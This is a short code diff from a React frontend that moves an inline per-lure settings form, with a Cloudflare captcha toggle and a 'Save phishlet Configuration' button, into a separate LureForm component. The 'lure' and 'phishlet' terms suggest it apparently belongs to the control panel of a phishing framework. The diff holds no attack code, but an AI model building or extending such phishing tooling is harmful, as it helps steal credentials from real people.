-                    <div className="space-y-2">
-                      <label className="flex items-center space-x-2">
-                        <input
-                          type="radio"
-                          data-allow-select="true"
-                          checked={lureFormStates[lure.id]?.useCaptcha || false}
-                          onChange={() =>
-                            handleLureFormChange(lure.id, "useCaptcha", true)
-                          }
-                          className="text-indigo-500"
-                        />
-                        <span className="text-gray-400">
-                          Use Cloudflare Captcha
-                        </span>
-                      </label>
-                      <label className="flex items-center space-x-2">
-                        <input
-                          type="radio"
-                          data-allow-select="true"
-                          checked={
-                            !(lureFormStates[lure.id]?.useCaptcha || false)
-                          }
-                          onChange={() =>
-                            handleLureFormChange(lure.id, "useCaptcha", false)
-                          }
-                          className="text-indigo-500"
-                        />
-                        <span className="text-gray-400">
-                          Do Not Use Captcha
-                        </span>
-                      </label>
-                    </div>
-                  </div>
-                </div>
-
-                <button
-                  type="submit"
-                  disabled={saving}
-                  className={`bg-indigo-500 text-white px-6 py-2 rounded ${
-                    saving
-                      ? "opacity-50 cursor-not-allowed"
-                      : "hover:bg-indigo-600"
-                  } transition-colors`}
-                >
-                  {saving ? "Saving..." : `Save ${lure.phishlet} Configuration`}
-                </button>
-              </form>
-            </section>
+          lures.map((lure, index) => (
+            <LureForm key={lure.id} lure={lure} index={index} />
           ))
         ) : (
           <div className="bg-[#232A34] rounded-lg p-6">
